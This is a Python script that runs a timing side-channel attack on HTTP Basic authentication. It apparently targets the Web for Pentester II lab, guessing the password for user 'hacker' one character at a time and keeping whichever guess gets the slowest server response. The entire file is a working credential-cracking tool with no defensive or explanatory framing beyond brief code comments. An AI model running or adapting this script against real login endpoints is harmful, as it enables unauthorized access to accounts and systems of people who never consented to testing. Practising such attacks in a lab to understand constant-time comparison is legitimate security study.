import requests, sys, string                                                    
from string import ascii_lowercase, digits                     
                                                                                
wfp2_site = sys.argv[0]                                                        
                                                                                
url = f'''http://{wfp2_site}/authentication/example2/''' 

class TimingSideChannelAttack(object):
    def __init__(self,wfp2_site):
        # wfp2_site = sys.argv[0]
        self.url = f'''http://{wfp2_site}/authentication/example2/''' 
    def timing(self):
        #The current password value                                                                                
        password = ''              
        #maxtime- the amount of time taken(max time) 
        maxtime=0
        #the no. of time we didn't get a match in the two loops.
        #this will be useful in breaking out of a loop.
        passwordfound=False
        while(True):
            my_dict=dict()
            my_dict_1=dict()
            #checking if we are getting a wrong alphabet in a round by iterating two times                                                                               
            for c in list(ascii_lowercase + digits):                                        
                response = requests.get(self.url, auth=('hacker',password+c))
                my_dict[response.elapsed.total_seconds()]=c                    
                print(f'Char {c}: {response.elapsed.total_seconds()} {response.text.rstrip()}') 
                if response.status_code==200:
                    passwordfound=True
                    password+=c
                    break
            for c in list(ascii_lowercase + digits):
                if passwordfound:
                    break
                response = requests.get(self.url, auth=('hacker',password+c)) 
                my_dict_1[response.elapsed.total_seconds()]=c                   
                print(f'Char {c}: {response.elapsed.total_seconds()} {response.text.rstrip()}')
            #checking if the alphabets are the same in both the iterations
            if passwordfound:
                break
            if my_dict[max(my_dict)]==my_dict_1[max(my_dict_1)]:
                password+=my_dict[max(my_dict)]
                donotupdatemaxtime=False
            else:
                donotupdatemaxtime=True
            if not donotupdatemaxtime:
                if max(my_dict)>maxtime:
                    maxtime=max(my_dict)
                else:
                    break
        return password

url=sys.argv[1]
sol=TimingSideChannelAttack(url)
print(sol.timing())